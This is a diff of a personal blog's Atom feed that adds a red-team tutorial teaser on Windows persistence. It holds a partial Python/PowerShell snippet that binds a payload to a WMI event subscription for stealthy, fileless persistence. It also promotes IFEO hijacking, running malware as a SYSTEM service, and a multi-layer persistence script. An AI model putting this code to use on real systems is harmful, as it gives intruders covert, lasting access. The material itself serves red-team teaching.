@@ -3,12 +3,85 @@
     <title>Maxwell Cross</title>
     <link href="https://maxwell-cross.com/feed.xml" rel="self" />
     <link href="https://maxwell-cross.com" />
-    <updated>2026-01-23T18:17:35-05:00</updated>
+    <updated>2026-01-23T18:20:49-05:00</updated>
     <author>
         <name>Maxwell Cross</name>
     </author>
     <id>https://maxwell-cross.com</id>
 
+    <entry>
+        <title>30 Days of Red Team: Day 8 — Windows Persistence</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-8.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-8.html</id>
+
+        <updated>2026-01-23T18:20:49-05:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Getting in is hard. Getting locked out is easy. You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius. Then the user reboots their computer. Your connection dies. Your shell is&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">Getting in is hard. Getting locked out is easy.</strong></h4>
+<p data-path-to-node="11">You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius.</p>
+<p data-path-to-node="12">Then the user reboots their computer.</p>
+<p data-path-to-node="13">Your connection dies. Your shell is gone. And because you didn't establish <strong data-path-to-node="13" data-index-in-node="75">Persistence</strong>, you have to start over from scratch.</p>
+<p data-path-to-node="14">Today, we begin Week 2 by ensuring that never happens. We are building the tools to survive reboots, logoffs, and even active hunting by the Blue Team.</p>
+<hr>
+<h4 data-path-to-node="16"><strong data-path-to-node="16" data-index-in-node="0">A Glimpse of the Code: WMI Event Subscriptions</strong></h4>
+<p data-path-to-node="17">Amateurs put a batch file in the Startup folder. Professionals use <strong data-path-to-node="17" data-index-in-node="67">WMI</strong>.</p>
+<p data-path-to-node="18">Windows Management Instrumentation (WMI) allows us to create "fileless" persistence that never touches the disk and doesn't show up in the Registry. Here is the core logic for binding a malicious payload to a system event:</p>
+<pre class="language-python"><code>def create_wmi_persistence(self, payload_command, event_name):
+    """
+    Creates WMI event subscription for stealthy persistence.
+    1. Filter: Defines WHEN to trigger (e.g., system uptime &gt; 2 min)
+    2. Consumer: Defines WHAT to run (our payload)
+    3. Binding: Connects them together
+    """
+    ps_script = f'''
+    # 1. Event Filter
+    $FilterArgs = @{{
+        name='_{event_name}_Filter';
+        EventNameSpace='root\\CimV2';
+        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
+               WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+    }};
+    
+    # 2. Event Consumer
+    $ConsumerArgs = @{{
+        name='_{event_name}_Consumer';
+        CommandLineTemplate="{payload_command}"
+    }};
+    
+    # 3. Binding
+    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding ...
+    '''
+    return ps_script</code></pre>
+<p>This script buries your access deep within the Windows operating system, making it incredibly difficult to detect without specialized forensic tools.</p>
+<hr>
+<h4 data-path-to-node="22"><strong data-path-to-node="22" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="23">
+<li>
+<p data-path-to-node="23,0,0"><strong data-path-to-node="23,0,0" data-index-in-node="0">The Registry Framework:</strong> 8 different methods to hook into the Windows Registry, including "Image File Execution Options" (IFEO) hijacking.</p>
+</li>
+<li>
+<p data-path-to-node="23,1,0"><strong data-path-to-node="23,1,0" data-index-in-node="0">Smart Scheduled Tasks:</strong> How to create tasks that trigger not just on time, but on specific events like <strong data-path-to-node="23,1,0" data-index-in-node="102">User Logon</strong> or <strong data-path-to-node="23,1,0" data-index-in-node="116">System Idle</strong>.</p>
+</li>
+<li>
+<p data-path-to-node="23,2,0"><strong data-path-to-node="23,2,0" data-index-in-node="0">Service Wrapper:</strong> A tool to run your malware as a legitimate background service with SYSTEM privileges.</p>
+</li>
+<li>
+<p data-path-to-node="23,3,0"><strong data-path-to-node="23,3,0" data-index-in-node="0">The Master Persistence Script:</strong> A "Nuclear Option" script that installs 7 layers of persistence simultaneously to guarantee you never lose access.</p>
+</li>
+</ul>
+<p data-path-to-node="24">The Golden Rule of Persistence: Always establish two doors. Today, we build them.</p>
+<p data-path-to-node="24"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-8-windows-persistence-mechanisms-bee31a6ba75d" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>30 Days of Red Team: Day 7 — The Master Framework</title>
         <author>
